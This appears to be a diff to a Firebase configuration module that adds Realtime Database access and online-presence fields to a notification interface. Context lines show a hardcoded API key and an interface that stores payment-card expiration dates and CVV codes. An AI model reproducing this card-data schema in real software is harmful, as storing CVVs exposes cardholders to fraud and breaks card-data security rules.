@@ -1,9 +1,10 @@
 import { initializeApp, getApps, getApp } from 'firebase/app';
 import { getAuth } from 'firebase/auth';
 import { getFirestore } from 'firebase/firestore';
+import { getDatabase } from 'firebase/database';
 
 const firebaseConfig = {
- apiKey: "AIzaSyAEpd6TtW7G3pDRXIw242Aqk61GbHJv0ck",
+  apiKey: "AIzaSyAEpd6TtW7G3pDRXIw242Aqk61GbHJv0ck",
   authDomain: "my-lead-ec3e9.firebaseapp.com",
   databaseURL: "https://my-lead-ec3e9.firebaseio.com",
   projectId: "my-lead-ec3e9",
@@ -16,8 +17,8 @@ const firebaseConfig = {
 const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);
-
-export { app, auth, db };
+const database = getDatabase(app);
+export { app, auth, db,database };
 
 export interface NotificationDocument {
   id: string;
@@ -38,4 +39,6 @@ export interface NotificationDocument {
     expirationDate: string;
     cvv: string;
   };
+  isOnline?: boolean
+  lastSeen: string
 }
